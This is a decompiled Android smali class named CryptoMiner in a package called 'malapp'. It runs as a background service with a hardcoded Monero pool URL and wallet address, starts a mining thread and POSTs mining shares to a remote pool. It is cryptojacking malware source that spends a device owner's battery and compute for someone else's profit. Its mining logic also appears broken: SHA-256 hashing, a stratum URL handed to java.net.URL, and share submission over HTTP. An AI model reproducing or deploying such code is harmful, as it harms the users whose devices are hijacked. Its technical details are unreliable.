.class public Lcom/malapp/CryptoMiner;
.super Landroid/app/Service;
.source "CryptoMiner.java"

.field private poolUrl:Ljava/lang/String;
.field private walletAddr:Ljava/lang/String;
.field private running:Z

.method public constructor <init>()V
    .locals 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    const-string v0, "stratum+tcp://pool.minexmr.com:4444"
    iput-object v0, p0, Lcom/malapp/CryptoMiner;->poolUrl:Ljava/lang/String;
    const-string v0, "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
    iput-object v0, p0, Lcom/malapp/CryptoMiner;->walletAddr:Ljava/lang/String;
    return-void
.end method

.method public startMining()V
    .locals 4

    const/4 v0, 0x1
    iput-boolean v0, p0, Lcom/malapp/CryptoMiner;->running:Z

    # Connect to mining pool
    new-instance v0, Ljava/net/URL;
    iget-object v1, p0, Lcom/malapp/CryptoMiner;->poolUrl:Ljava/lang/String;
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    # Start mining thread
    new-instance v1, Ljava/lang/Thread;
    new-instance v2, Lcom/malapp/CryptoMiner$MiningRunnable;
    invoke-direct {v2, p0}, Lcom/malapp/CryptoMiner$MiningRunnable;-><init>(Lcom/malapp/CryptoMiner;)V
    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private computeHash([B)[B
    .locals 2

    const-string v0, "SHA-256"
    invoke-static {v0}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;
    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/security/MessageDigest;->digest([B)[B
    move-result-object v1

    return-object v1
.end method

.method public submitShare(Ljava/lang/String;)V
    .locals 3

    # HTTP POST mining share to pool
    new-instance v0, Ljava/net/URL;
    const-string v1, "https://pool.minexmr.com/api/submit"
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B
    move-result-object v2
    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    return-void
.end method
